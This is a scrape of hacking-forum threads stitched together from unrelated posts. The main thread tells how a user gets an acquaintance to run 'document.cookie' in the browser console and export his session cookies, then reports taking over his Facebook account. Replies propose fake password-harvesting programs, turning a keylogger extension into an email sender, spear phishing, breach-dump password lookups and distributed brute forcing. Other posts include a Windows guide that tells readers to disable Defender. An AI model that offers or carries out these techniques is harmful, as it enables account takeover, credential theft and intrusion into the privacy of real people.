Probably not a vulnerability bug. Most likely just a redirection loop mistake. A sends you to B, B sends you to A, and then your browser picks up on the loop and stops it.   Impossible to tell without more information.                       Edited by ande (Tuesday 20th of September 2016 02:01:58 PM)

Ok...buckle your seat belt, because I am about to take you down the rabbit hole.    So, aside from the standard edge protections implemented in regular companies that can afford to, and all your general security products...certain U.S. military/government networks are truly...and I hate using this word, but since I am using it now, you will know I am serious...unique.   They have already thought of the cellphone-plugged-into-computer attack vector, because there was a major security incident about 10 years ago centered around a usb flash drive. After that incident, every military network implemented a BlueCoat proxy with a self-developed USB/cell phone detection module which leverages some pretty epic scientific HMI and Windows registry identification. That module then makes an authorized domain user unauthorized and simultaneously alerts security forces personnel of the offending user and their physical location within the network. Now that we've got that out of the way, let's dive even deeper into a very gray area that will probably put evilzone on a watchlist after I make this post.   Some government/military networks are secured with an in-line network encryption device called a taclane (product from a company called General Dynamics) which acts in a similar manner that VPN devices operate; however, they are far, far, more complex. The encryption protocol used on these is called FireFly, and due to a non-disclosure agreement that I am still binded to for the next 70 years I cannot say anything further about this subject. The only thing I can reference you to is this link from 1999 which can be found here: https://tools.ietf.org/html/rfc2522   If you want to try setting up a similar topology, you can create a lab that entails two vpn concentrators, a core switch, and LANs on either side of the VPN devices.   |LAN| -- |VPN| -- |SW| -- |VPN| -- |LAN|   There have been security incidents on these highly secured networks and every single one that I personally saw was from insider abuse. Unlike certain VPN configurations, these type of networks cannot be broken into from the outside without acts of espionage, as it is mathematically infeasible.   If you want to go with the topology I've proposed above, you can start doing some research on VPN aggressive-mode, and develop a mobile app that can capture and crack the IKE.    Alternatively, you can build a simpler lab with your laptop wifi/ethernet adapter idea and simply create a dual-honed virtual machine connected to two other virtual machines on logically segregated networks.    |VM1/network 1| -- |VM2/network 1 & 2| -- |VM3/network 2|   Kinda like that. That's a super simple lab to create and even easier to penetrate as all you need to do after compromising VM2 is create a reverse tunnel with the protocol of your choice between VM1 and VM3.

First get the IP address of the victim and put the IP address in "whois" lookup. You will get the Internet Service provider of the victim.

So, there's a guy who's like..   Him: "Yo, I need you"  Me: "Why? Do you want me to hack a Facebook account?"  Him: (immediately responds) "Can you hack an fb account?"  Us: "LOL"   (true story)   Anyway... He wants to hack his crush's account or something to "know who's she talking to". The typical "can u hak my gfz fb plzz??"...   So I how about I hack HIM?    I told him to go to his girl's profile page, inspect element, go to console, and type: //ignore.errors(), //bla bla bla, hacky-looking stuff, and then: console.info("mpampitsaki.cookieID:"); document.cookie   Me: What does it say?  Him: *Gives me his cookies...*   So I got them cookies. What now? How do I implant them on my browser?   What his cookies look like: Codea11y=XXXXXXXXXXXXXXXX; x-referer=XXXXXXXXXXXXXXXX; p=-2; act=XXXXXXXXX; c_user=XXXXXXXXXXXX; csm=2; wd=1366x643; presence=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX            .CodeMirror {height: auto;}      var element = document.getElementById("code-2DlOw8XfW5");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "text/javascript",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });        I have an extension called: EditThisCookie (in Chrome), and I tried implanting all these onto my browser while at facebook.com (logged out). I refreshed the page but I'm not logged in as him. I'm still logged out... Does facebook have some sort of protection against this or what?   EDIT: If Facebook DOES have Session Hijacking protection somehow, is there a way I can still get access to his account, apart from phishing? Note, he's pretty dumb.          Edited by NullSec (Sunday 21st of August 2016 12:59:51 AM)
Maybe if the cookie is automatically linked to a new IP address it means you cannot use that cookie session with your IP address and need to login with the password to enable the account and your IP to work together... Maybe. That is just a theory.   Maybe get him to disclose his password... Be creative, if he is that dumb he will listen to whatever you say...                       Edited by Katheudo (Sunday 21st of August 2016 01:52:29 AM)
Even if you do get to his account there is a possibility you may not be able to do certain things eg: change password; email etc.   Most sites make you reauthenticate if you try to do a priviliged action, unless you want to post stupid shit on his wall in which case not a bad idea.   Possibly this might help, http://www.rafayhackingarticles.net/2011/07/facebook-cookie-stealing-and-session.html
Login to facebook, replace cookies, refresh.

What about using Tor to get an IP similar to his (located in the same city as him)?
Quote by noncetonicLogin to facebook, replace cookies, refresh.   I tried it and it logs me out as soon as I refresh the page, having replaced the cookies.
Using "Cookies Manager+" for firefox should work... but maybe they have hijacking protection by now. Few years ago you could very simply do this shit with DroidSheep. Man that was fun
I don't know, man. I wish they had a "Take Cookie" button like they have under our Profiles...     Either way, I'm gonna get him to install EditThisCookie (Chrome Extension) and tell him to click the export button and give me the output, let's see how it turns out..

What about using Tor to get an IP similar to his (located in the same city as him)?   Yeah that could work but then if Facebook is intelligent they might see that IP as a Tor Exit node  I think the best way to handle this is to write some quick malware, maybe like a fake Facebook account hacker type program in C# WPF, have a box which you ask him to type in hes password which then emails it to a random email you have access to. Boom you then have his password...   Something like this but say he needs to use his password for it to work:           Edited by Katheudo (Sunday 21st of August 2016 10:08:55 PM)
Ahahahahaha that Screenshot though ^ 😂 😂 😂   I've already found a nice Chrome Keylogger: https://www.ericzhang.me/projects/chromelogger/ but I don't know much about coding Chrome Extensions etc., and what this does is it saves the logs onto the victim's computer. Could you or someone else make this so it sends it to my email or uploads it to a Server or something?   That would be perfect, and the best way to snatch passwords.
If you have Visual Studio, create a new C# WPF project, design the interface using the drag and drop feature, set a background and then all you need to do is look up on how to send an email using C# after clicking a button. Simple.
He's not that dumb to get convinced by such a sketchy-looking tool. Can't the extension just be modified to send a mail to me?
Quote by NullSecHe's not that dumb to get convinced by such a sketchy-looking tool. Can't the extension just be modified to send a mail to me?   Arrh right I thought from the way you were describing this situation the guy sounded really easy to convince. I am not sure about the Chrome extension as I am not sure what language is used and if it allows the use of sending emails etc... Maybe find out which language is used to program Chrome extensions (Probably Java or JavaScript) and see if you can look up a tutorial of how to send emails in that language...
Lol @ the design   This so reminds me of the BIOS logging program I made many moons ago... I wrote about it in the old forum and here: http://9v.lt/blog/bios-password-logging-program/  It probably doesn't work on modern systems, but meh.  Btw if you have to remotely transmit the data, don't hardcode the values (like host, username, password) into the program, like VicSpy and other shitty keyloggers were doing. Instead make a central repo somewhere that receives the data through web requests - that is much safer IMO. I had made this implementation (tho shitty, needs improvement lol) and wrote about it here: http://9v.lt/blog/outlooker-malware-in-c/
I got the cookies, guys. And got access to his Account.    Damn, it's been 5 years since I was trying to get into the dude's account... xD
Care to explain how you did it then?
Screenshot or it didn't happen
Quote by KatheudoCare to explain how you did it then?   I got him to install "EditThisCookie" (Chrome Extension), he did, I told him to click the "Export" button on the extension, then go to pastebin, paste it all in, name it "inject.facebook()" (yep. seems legit. 100% working GUARANTEED!!!) then I went to his paste, copied everything, went to my EditThisCookie and imported his cookies.   Before, I got his cookies with Chrome Console (document.cookie) but couldn't really import them to mine for some reason..

Anyway, I'll re-steal them and take a screenshot!
It's more likely that important session cookies were marked as Secure/HTTPOnly and thus were not exposed via document.cookie
Quote by NullSecI got the cookies, guys. And got access to his Account.    Damn, it's been 5 years since I was trying to get into the dude's account... xD  So he's your friend and you want to hack him, that seems a bit weird.

It's his girlfriend and he wants to hack her?   "hey guyz plz hak dis fb acc hes my friend plzzz" - Those people who ask that are not evil to want to hack into their friend's account (ok they may be dumb, but not evil).   I don't wanna hack his bank account and make him homeless, just get into his facebook account and stuff.                       Edited by NullSec (Tuesday 23rd of August 2016 06:16:04 PM)
Quote by luvisrageemail me gwoppamane@mail.com I can help you out   I have got hold of his account already. Thanks.
Just send him a spear phishing email using a dummy email account saying his account has been hijacked and make a web form in which he has to input his username and password.
Admins, I request this to be locked.
You could write your own program to do this if you wanted. Morever, I believe this belongs in the Hacking & Security section

You mean brute-force? If so, no, it does not work on Facebook or any major website these days.
what if i say I know a script that can bruteforce facebook, you just need to have multiple wordlists no more than 150 words, which you can easily generate with CUPP.
Well that's interesting, tell me more !

While indeed you specified that bruteforcing your way in does take a lot of time, you could try a dictionary attack with common passwords, however that has a pretty low chance of working.   One way would be to pay for a VPS with good specs, but that costs too much ( I gues you could split the bill with people who also want to bruteforce more efficiently and share the VPS).   A way to make bruteforcing more effective is to use the GPU instead of the CPU ( some tools like hashcat have that feature I think )
I have tried c9 VPS, it's free and it is better than my computer & my slow internet bruteforcing, but it's still not like 100 attempts/sec.   But why does computer specs matter in online attacks? I understand, that for offline attacks you need good specs etc., but I thought that online attacks only needed a speedy internet connection to be effective. Why do they also require your computer to have good specs?                       Edited by NullSec (Thursday 25th of August 2016 10:50:35 AM)
Yes, they require some processing power, but you are right, it matters how fast your internet is, you want to send and recieve the infornation fast. It also depends how fast their server handles requests.
You shouldn't be wildly bruteforcing is the main thing unless you are doing offline attacks. You should build a profile on the target and then gear your wordlist towards that.   Additionally, with the rampant amount of password reuse we see, sometimes you don't even have to bruteforce a password, simply look up a person's email and see if they have been in a database breach and many times you will find either a plaintext password or simple MD5 hash which is (often) easily cracked.
As websites slowly implement better hashing algorithms, time restrictments, account locking and other anti-bruteforce techniques, online bruteforce is indeed coming to an end. But it will never die entirely. Bruteforce is something we all do from time to time when we cant remember what password you used here and there.   Offline bruteforce; AKA cracking information you have already obtained, is however very much still a thing. But as has been mentioned in this thread already; You are no longer limited to your network and server speeds. You are now limited by our computer power, software and configuration optimization.   Depending on whether you are targeting a specific person or account, or just anything in a set of encrypted/hashed data: Wordlists, rainbow tables and profiling is your friend. Also just googling hashes can sometimes be interesting.    As also mentioned, GPU is much faster than CPU, and there exists lots of tools out there that can help you take advantage of the GPU for bruteforcing.   You also have the option of doing multi-computer (distributed) bruteforce. I will let you find out what that means.

Interesting information @ande, thanks for sharing!    I will assume that distributed brute-force attack is when you set 2 or more computer to perform the attack at the same time, so it goes much faster. But if they all did it at the same time on the same network, wouldn't that slow the internet down, meaning there would be the same speed as if 1 computer did the attack?   I think that would only work in VPS, where they have pretty "good" internet, and have bandwidth limitation. Where you'd make multiple accounts perform distributed brute-force attacks without any speed limitations.

Distributed attacks can be performed when there are IP limitations or if the server you are attacking can handle more than you can do with one machine. This makes the attack faster obviously.   You are right about the resources issue. If you do an attack that is too large for the server(s) to handle, it will just slow you down or even crash altogether. So this has to be taken into considuration, otherwise you are no longer performing a bruteforce attack, you are now performing a Denial of Service (DoS) attack. Which will have very different outcomes..    Not entierly sure what you mean about the VPS part. Attack a VPS or use VPS's to attack with? You will most likely not get very good results if you are attacking a VPS with a ditributed attack. VPS's are generally slow.   Attacking with VPS's sounds expensive. But it is a better alternative than using your home connection and multiple computers (mostly because you are limited by your bandwidth, IP's and the number of computers you have (as well as anonymity)).   Distributed attacks are commenly performed with botnets, proxies, anonymity networks like Tor, hacked servers, and yes just virtual or dedicated servers that you can rent.

DDoS them back? If you leave them alone they will stop. No one's gonna waste their time DDoSing you, unless they've setup a VPS to do it. If that's the case, turn your router off for about 10 minutes, turn it back on, and you've got a new IP. Their VPS won't be able to DDoS your old IP, so you are good to go. Just make sure they don't get your IP, so you don't have to re-turn on & off your router again.

First, you can introduce yourself if you'd like in the member introduction forum. Otherwise, best place to start is to look around, read some of the posts, ask any questions you have about hacking and security probably over in the beginner's corner, unless they fit better elsewhere, help answer any questions that you're able to answer, or if none of that sounds particularly interesting at the moment, you can just stalk people around the forums and see what you can pick up from the posts we already have.
If you are unfermiliar with this site, you may not know that we basically just started over with a new system. So there is not a whole lot here yet. But as ArmorTaco said, feel free to look around. Read, share and learn. More will come

Actually from what I've read the exploit allows an attacker to do whatever he wants with the drive as if he had physical access.   But in an encrypted drive, the data is obviously still encrypted. So it doesn't change the fact that you need the correct passphrase to decrypt the data.   Manipulating encrypted blocks of data doesn't make much of a difference in my opinion. If an attacker has physical access to your device he can do a lot of other nasty things as well so in my opinion the risk of this vulnerability has been a bit exaggerated than what it actually is.
@f474a it may have been a little bit exaggerated, the risk. But if one can copy the encrypted hard drive at an initial stage, later he can bruteforce it in a controlled environment. Don't you agree?

200 Million for 3 BTC only? I guess the dude who's selling it wants it to be gone fast.
I'll bet yahoo are glad they didn't stall on the sale, or i wonder if they had any inkling of the breach and kept it quiet so as to do the deal ? It would cause a massive stink if it came out they were aware of a possible breach before the sale.
Had my first ever email hacked on yahoo over 3 years ago, worst email provider going !    ..... No surprise its been hacked multiple times.

If you still have the same password from 2012 you should probably get off the internet
Quote by x_XIf you still have the same password from 2012 you should probably get off the internet  Yeah, probably. The average Joe does not use a strong password or a personal password policy to change password now and then.   It's bad for that person but great for hackers.   The only way to learn is to become a victim for most people it seems.
This is one of the concerning reasons as to why I do not use or recommended online data backup.  Backing up to cloud services makes you and your data vulnerable and at least with the data on a hard drive you know that your data is safe and in your hands and not the hands of the hackers.   This story is pleasing to here is some thoughts as my advice and fears had come true and shows the lack of security weaknesses to cloud online services.
I was reading up on this last night. Its a pretty good illustration of why you should change your password every 3 months or so. I tend to use haveibeenpwned.com to check my accounts when shit like this goes down. I have NO IDEA how reliable it is mind, but it seems pretty accurate.

Not being a huge fanboy about big corporations and their setups, nor am I saying everyone of them are doing a perfect job or cannot do mistakes. But lets face it, they spend millions on security every year.   The security breach this data originates from was not due to a technical error, but an employee that used the same password on multiple or all of his or hers accounts.   You cannot possibly be sure that your "data is safe in in your hands and not the hands of the hackers". Not like steeling data from your hard drive is any different.   Cloud storage and cloud computing is essential to our every day lives at this point. The rules are simple: Would you mind this data being public? Encrypt it and upload it. Are you still worried after encrypting it? Don't upload it.                       Edited by ande (Thursday 1st of September 2016 09:03:28 PM)

Shiiit, just another proof that literally nothing is safe anymore. If someone, or well, a group really want to get into a system, they fucking will.
Wow what a hit they've took there, i thought Btc exchanges etc were up there with some of the best security so does that show that with the right knowledge and skills it is possible to hack pretty much most things sites etc or does something as big as that point towards it more than likely being an inside job do you think ?

I went through a lot of the modules. In my honest opinion, this course was not good. I mean, it's an "ok" resource for getting theory, but overall this course was just trash. He gave maybe a handful of examples/demos, and it was mostly just the guy ranting about "well this is the theory behind how I saw it done back in the old days," and then speculating on what's currently going on without actually understanding modern concepts. Even the old examples he gave really weren't that well done. I feel bad if anyone actually paid money for this course.
Let's not kid ourselves. He is the only one who actively shares resources. What do you mean by trash? It would help someone get started.

Hello, this is my first post in this forum.

(Mine is located HERE)... if you take my links and add them to your thread I'll delete my thread. That way EvilZone will have a wiki-like, comprehensive go-to list rather than seperate scattered compilations.
Lingen and scihub are some important sites as well

I prefer pyinstaller but thanks for sharing, you deserve a lot of cookies fresh man!
FYI   This is a very 'basic' tutorial. This will not work on most projects that call out for other python modules. This tutorial pretty much works on helloworld.py but wont work on scapy.   Both py2exe and pyinstaller require advanced tweaking / finesse when trying to export linux python libraries to a single windows executeable. Usually requires opening the package after compiling and manually inserting dlls and modules.          Edited by 0E800 (Friday 28th of October 2016 09:29:26 PM)

You know there are images made specifically for VMWare, Virtualbox, or Hyper-V.    https://www.offensive-security.com/kali-linux-vmware-virtualbox-image-download/
Ik but they are useless.
Quote by KnifeBossIk but they are useless.   Please elaborate.
They are pre-customized and setup so you can't set it up your way with your preferences and requirements.
In your video though, I don't see any "customization" versus a normal Kali install either in a VM or physical computer.  I started watching the video the first time, then stopped when I saw you just doing it with a standard ISO download.   After your comment above, I then thought they had added some settings into the installer.  So went back and watched the whole video, and it still looks the same install routine.   I do like that they offer ISO images with a different desktop environment versus just stuck with gnome, as I can't stand gnome.  Granted those haven't made it down to the virtual machines, but the DE can still be switched.   Sure by default your stuck with toor as the root password, and pre-generated SSH keys, but those two things can be easily changed.

Much appreciate the time and effort you put into creating the tutorial. I like how you explained the simplicity of it.   I was getting so used to new users registering on the forum just to make their first post a question about how to hack facebook, so having a newcomer start off with a tutorial is refreshing to say the least.   Any chance you can include instructions for creating a single windows exe for the client using py2exe or similar?                        Edited by 0E800 (Monday 24th of October 2016 10:53:03 PM)

Thanx i found this very usefull..
Very usefull, thank you!
I would like permission to include in evilzine. It was a pleasant read.
@0E800 Absolutely, feel free to include it. Just let me know when its done, would love to read your finished product!
Brilliant Information you have provided, but some acts may still put your identity at risk during Tor browsing, such as using google or visiting http sites  (Just be aware that Tor does not grant you 100% anonymity, there are no havens on the internet.)   The government in my country doesn't seem to take cyber surveillance too seriously. In fact, people have way too much freedom on the net. So I don't find it urgent to browse with Tor. This is just for me, as i do not require such anonymity.

yeah it all depends on the state, and how seriously they take you're privacy. Tor and things like tails, do not by any means guarantee your anonymity, but they do make it much harder for snoopers. Even leaked papers from the CIA and NSA have said stated what a thorn in the side they can be.  Thanks for the feedback man.

Quote by Krypto_lizer[size=12]SQL Injection:   Like this website: www.website.com/index.php?id=84   ?id=84 means it’s fetching something with the id 84 from a database and this is our way to communicate with the database.    I'd just like to quickly add that ?id=84 doesn't exactly mean the website is querying a database. This addition to the URL tells the server that there is an HTTP GET request with a parameter(variable) named "id" which is set to value 84. While it is the case that many times this is calling to a database, it is important to let beginners understand HTTP Methods and why they are not strictly related to SQLi
This isn't error based injection since our queries aren't being returned in error messages. This is a tutorial for union injection, since we are able to simply use the union statement to have the results to our injected queries returned alongside the original query.    Error based injection is used when this isn't possible (because the results of any queries aren't returned to the user). Error based injection involves forcing the database to throw an error which will return the results to our injection queries. For example, by causing an overflowing the exp() mysql function with injected queries. The database will throw an error which is returned to the user/attacker, however the statements we have injected will be executed first and returned in the error message.    You can read more about the above mentioned method in this blog post https://osandamalith.com/2015/07/15/error-based-sql-injection-using-exp/         Edited by H3L1X (Tuesday 11th of October 2016 11:54:38 PM)

How to Secure Windows 10: The Paranoid's Guide  Introduction    Some parts in this guide can be done by the many programs that people have already created to automate this process, however you could use this as a check list as you are installing Windows 10 or if you wish to do each step manually and not have it done by a program. Also I would agree some steps in this guide are a little anal and take things to far but I tried to go as deep as I could.   Yes I know the first step to privacy with Windows is never to install it and use Linux or no computer at all, but some of us need it for work related tasks or development. So here is my guide that should increase privacy on Windows 10...   Basic    First thing I would go and do is make sure to download and install Windows 10 Enterprise just so you can turn of telemetry completely and have control over Windows updates. You will have to torrent this or buy it if you have the money. Once you have your Windows ISO ready for install do the following:   -Do not choose express settings in the installation process. Click custom and turn everything off or to your liking.   -Use a local account and never use a Microsoft account to login with Windows 10. Same if you are on Windows 8/8.1   -Use the subtle login style. To do this press your Windows key + R and type "gpedit.msc" and hit enter. Navigate to "Computer Configuration" -> "Windows Settings" -> "Security Settings" -> "Local Policies" -> "Security Options" and find interactive login, then enable "Interactive logon: Do not display last user name". You also want to enable do not display account details when the computer is locked as well.   -After the install is done go to PC Settings > Privacy and disable everything unless you need some settings on. I would turn all that crap off    -While in the privacy settings page remember to turn off any Feedback...    -Turn off sharing updates, go to PC Settings > Update and Security > Advanced Options > Choose how updates are delivered and check the PCs on my local network and then switch it off.   -Disable web search by going to the search bar and clicking settings icon and choose never to include web results.    -Change the name of your computer by going to PC Settings > System > About and PC name should be at the top with a button saying rename PC. Change it to something random.    -Install the Classic Shell Start Menu to replace the horrible mess the start menu in Windows 10 is loaded with like Cortana, web search and metro apps. You can get this from: http://www.classicshell.net/   Advanced    -Open the command prompt as administrator, and enter the following which will disable two Windows 10 data collection services:  Codesc delete DiagTrack  sc delete dmwappushservice  echo "" > C:\ProgramData\Microsoft\Diagnosis\ETLLogs\AutoLogger\AutoLogger-Diagtrack-Listener.etl            .CodeMirror {height: auto;}      var element = document.getElementById("code-rkKFmJznVJ");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "text/javascript",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });        -Disable telemetry in Windows 10 Enterprise: Click start and search for and run as administrator gpedit.msc go to Computer Configuration > Administrative Templates > Windows Components > Data Collection and Preview Builds. Double click Telemetry, hit Disabled, then apply. This method does only work on Enterprise versions of Windows 10, if you have Home or PRO please look below under the extras tab.   -Instead of manually disabling a huge amount of Windows 10 Privacy settings/ features I recommend using a program called O&O ShutUp10 which you can find here: http://www.oo-software.com/en/shutup10 it will make the process a lot quicker than doing these task by hand.   -I then recommend running another Windows 10 Ati Spy program which you can find here https://github.com/Nummer/Destroy-Windows-10-Spying This enables you to disable certain services, add firewall rules and uninstall those horrible Metro Apps.  Note: Be adware that certain settings enabled by the above Windows 10 spying programs may cause Windows update to be disabled, make sure you understand what you are enabling.   -I also recommend running a program called Anti-Beacon from Safer-Networking; the creators of Spybot. Spybot Anti-Beacon is a standalone tool which was designed to block and stop the various tracking (telemetry) issues present in Windows 10. Anti-Beacon is small, simple to use, and is provided free of charge. It was created to address the privacy concerns of users of Windows 10 who do not wish to have information about their PC usage sent to Microsoft. Simply clicking "Immunize" on the main screen of Anti-Beacon will immediately disable any known tracking features included by Microsoft in the operating system. You can find this program here: https://www.safer-networking.org/spybot-anti-beacon/   -Next, to completely make sure OneDrive won't bother you ever again, open up gpedit.msc while running it as admin, go to  Computer Configuration > Administrative Templates > Windows Components > OneDrive, double click Prevent the usage of OneDrive for file storage, hit Enabled, then apply.   -While still in the Group Policy Editor, go through Computer Configuration > Administrative Templates > Windows Components > Windows Defender, double click Turn Off Windows Defender, hit Enabled, then apply. Then either use no antivirus or install a third party one, really you only need an antivirus if you are a complete noob and are downloading untrusted content. Use a sandboxie or virtual machine... Antivirus programs use CPU time and memory as well. I am using Common Sense 2015 currently.    -Next to further more disable Windows telemetry go to regedit as admin go through HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\DataCollection, select AllowTelemetry, change its value to 0, then apply.    -IMPORTANT: Windows 10 has a new DNS feature called multi-homed named resolution, which gets around making only DNS request directly through your VPN tunnel. This works by Windows 10 sending multiple DNS requests through all available network interfaces, it does this to try and "improve" web performance; which is does but it completely makes your VPN/ Proxy pointless as you will then be leaking DNS requests through your normal ISP IP/ connection and not the VPN IP/ connection. Then Windows 10 will use the fastest DNS response which may not be your VPN every time. Please look in the extras tab for more information about this. To fix this problem please see below:  Windows 10 Enterprise/ Server Only: To fix the Windows 10 DNS problem goto gpedit.exe and disable Smart Multi-Homed Name Resolution under Administrative Templates → Network → DNS Client → Turn off smart multi-homed name resolution.  Windows 10 Home Users: The only solution at the moment is to set predefined DNS servers in your network interface under Control Panel -> Network and Sharing Center -> Change adapter settings -> right click your internet connection -> Properties. Disable IPv6 and change the IPv4 settings to use a custom DNS server. I recommend using your VPN DNS server IP and then an open source DNS server for the alternative one, or a DNS server your trust won't log you or track you.    -I then would recommend you change your hosts file to block some of the Microsoft and ad IPs that are used by them, however Microsoft have said that their host names will ignore the hosts file and bypass it. But this does not mean every host name of theirs, if you wish to add this extra layer please add these host names in your Windows host file: (Please refer to PeerBlock if you want to block Microsoft IPs at the outgoing network level in the extras tab below.)  Please note some add networks and the bing domain may be blocked.

that she could come back with Windows updates in the future, but most of the following should disable her for good. The guide to disable Cortana will start with simple and easy tasks to hide her from Windows, then slowly move onto more advanced methods to remove her from the underlying workings of the OS and not just hide her. The goal is to remove her not hide her, so by following this process keep in mind that you may have to reinstall Windows in order to restore Cortana again.   Step 1: After you complete a fresh install of Windows 10 you will notice Cortana is in the task bar integrated with the search feature, to remove this right click on the task bar and navigate to Search > Disable. Done. This does not turn off Cortana but just removes Cortana from the tasks bar for now.   Step 2: Next we need to turn Cortana the way Windows lets you, to do so click the Start Icon and click the gear icon. At the top you should see "Cortana can give you suggestions, ideas, reminders, alerts, and more." - Use the radio button to turn this off. Again we are not done yet, she is only inactive for now, still alive... While on the settings menu, you might as well turn off "Search with the web and Bing"... If you use Classic Start, this should not be a problem.  Before you continue please note the following process can possibly break the Windows 10 Search feature and original Start Menu, either don't follow or install Classic Start to use an alternative Start Menu. This process cannot be undone. A complete OS install would need to be done to restore Cortana, Search and the Start Menu again.   Step 3: To complete the next step there are two ways of doing it. You can either fully disable Cortana or completely remove Cortana. I suggest the first method as you are able to somewhat restore Cortana if need be and the first method is less harsh on Windows. The second method involves you using a small batch file from winaero.com, this is if you wish to completely remove Cortana forever, this method also means it is harder for Windows updates to restore Cortana, whereas the first method does mean Cortana could be restored through Windows updates but is unlikely.   - Method 1:   Before continuing you will need to take ownership of system folders and programs, I have used the following program to achieve this: http://www.winranx.com/uninstall-windows-10-cortana-application/ If you have other ways of doing so use your own way...   Open up Windows explorer and navigate to Windows > SystemApps and you should see the application folders for some of Window 10s core applications... You Should see a folder named "Microsoft.Windows.Cortana_cw5n1h2txyewy" (Yours may be different in terms of the end characters). Navigate inside that folder and find a .exe called "SearchUI.exe", you then want to rename it to break the application link. I renamed mine to "FUCKOFF_SearchUI.exe".   This way Windows will not be able to start the application again because the program has a different name. Plus you can restore it by just renaming it again. If you navigate back from the Cortana folder which is located in SystemApps where we were before we found the program called "SearchUI.exe", you may want to rename the Cortana folder to something else as well, to break the path of the folder which Windows will look for. I renamed mine from "Microsoft.Windows.Cortana_cw5n1h2txyewy" to "FUCKOFF_Microsoft.Windows.Cortana_cw5n1h2txyewy".   You may also want to do this to the other core applications like Contact Support, Bio Enrollment, Microsoft Edge etc... All located in the same folder.   You may want to restart Windows in order for this method to take full effect. But that is it, Cortana should now be gone. Watch out for Windows Updates though, make sure Cortana does not come back by checking after any updates.  Remember to kill the Search/ Cortana application from within the Windows Task Manager!   - Method 2:   Visit http://winaero.com/blog/how-to-uninstall-and-remove-cortana-in-windows-10/ and follow the guide on the blog.   Miscellaneous    -Install PeerBlock (Link in extras tab below) and add the Microsoft IP Blok List from https://www.iblocklist.com/lists then run this program 24/7.    -Change your Mac Address from time to time, use Google to find a program to perform this; or use the Linux command line if you use Linux.   -Never use Microsoft Edge/ Internet Explorer. Use an open source browser or FireFox... Chromium... etc...   -Use VLC instead of Windows Media Player.   -Encrypt your storage drive(s) with VeraCrypt, however VeraCrypt does not support GPT partitions at this time and has not got full support for UEFI yet, you can get VeraCrypt from here: https://veracrypt.codeplex.com/   -Do NOT use Windows BitLocker ever, it is closed source and who knows what backdoor they have.   -Use a VPN or Proxy. Make sure you read there terms and conditions and making sure they have a no log policy.    -When installing any program check the settings and see if you agree with any privacy settings or change them to your needs. Look for things like send program use information, turn that off for example...    -Use Linux for any sensitive tasks and only use Windows operating systems if you need it.   -Use an encrypted email service such as https://protonmail.com/ or https://privatoria.net/   -Use the information about privacy at https://www.privacytools.io/   Extras   Disable telemetry in Windows 10 in Home and Pro  - http://winaero.com/blog/how-to-disable-telemetry-and-data-collection-in-windows-10/  Open Source Windows 10 Privacy Programs  - https://github.com/Nummer/Destroy-Windows-10-Spying  - https://github.com/10se1ucgo/DisableWinTracking  - https://github.com/W4RH4WK/Debloat-Windows-10  Windows 10 VPN Users at Big Risk of DNS Leaks  - https://www.bestvpn.com/blog/28318/warning-windows-10-vpn-users-at-big-risk-of-dns-leaks-2/  - http://www.qwealthreport.com/windows-10-users-beware-of-this-new-security-risk/  Peer Block  - http://www.peerblock.com/  Windows 10 2016 Anniversary Update Privacy Settings  http://www.extremetech.com/computing/233499-how-to-lock-down-windows-10-anniversary-update-to-protect-your-privacy  How to Disable Cortana Discussion Forum  -http://www.tenforums.com/software-apps/14300-how-permanently-disable-cortana.html  Extra Reads and Information  - http://thenextweb.com/microsoft/2015/07/29/wind-nos/#gref  - http://www.theguardian.com/technology/askjack/2015/aug/15/windows-10-microsoft-should-privacy-problems-worry-me  - http://www.digitaltrends.com/computing/windows-10-privacy/  - http://lifehacker.com/what-windows-10s-privacy-nightmare-settings-actually-1722267229  - https://www.youtube.com/watch?v=r8_kXzTjU0k  - https://www.youtube.com/watch?v=goy0jBquW10  - https://fix10.isleaked.com/  - http://thehackernews.com/2015/08/secure-install-windows-10.html   Conclusion    Thank you for reading.

Personally I believe kath.. as I wasn't even around durring the green screen days.

However now that I've edited my post this far I'm wondering about this green screen version of evilzone as I don't believe windows 10 was out when I joined evilzone. I joined durring smf 2.x.

It was the version SMF (14.03.2011 - 29.02.2016) which was when I first posted that Windows 10 post, I think it would show it from like the 8th of December I think, cannot remember. I contacted Ande to either get me a screen shot or allow me access to take a screen shot myself just to prove and defend my content.   Here is the other post from SMF (It only shows that I posted it on the 31 Dec but still shows it was before any other forum if you check):     Also for 0E800 as he was like the 3rd post:     I also purposely contacted Ande to get my post back so that I could update it and post it on this new version of the forum, I did not ask for the older one the first time round because that one was outdated more than the IPS forum post I made.   You may think I am going to far here, but I don't want people to view as some sort of copy and paste whole on this forum.

Why not simply stop using Win10 totally? That would be way more efficient.
I found this incredibly useful, I was already using some things for it tho.   Thank you!   --Slendeh
Quote by PhageWhy not simply stop using Win10 totally? That would be way more efficient.   That would be great! I installed Linux on my laptop and tried to use it full time and do away with Windows. But my current hardware does not mix well with Linux and I need Windows 10 for Uni. So that is why I made this guide
Quote by PhageWhy not simply stop using Win10 totally? That would be way more efficient.    I agree, but some of us are gamers, and no other OS can compete with the amount of games available for Windows. Preferably we should have a machine with Linux as well, for everything else.
Why use Windows you ask?   The reason being that your employer will most likely run proprietary software that requires proprietary plugins that only support windows.   The reason is that your games won't work or your video drivers suck on Linux.   The reason being a mac book pro uncapable of being upgraded past snow Leopard can still run Windows better than OSX.   Another good reason is because Linux and OSX cant do touch screen like windows can.    The reason is that technology and computers are your hobbie and being biased against the make and model of any tool is straight up ghey.   Better to look within yourself and hack that part of your brain that makes you so hard for privacy. Have faith and be bold, walk into the dark where the wolves are hungry and fear no steps forward.

I see you are still very favorable of your mac.  Games are a waste of time and so therefore should not be counted is very opinionated concidering the amount of steam users there are and the amount of revenue that games generate.    Just because your mac doesn't have a touch screen doesn't mean that all laptops that do have touch screens are somehow less capable of doing what a computer aught to.   Hate it or love it, best to be comfortable in any environment.
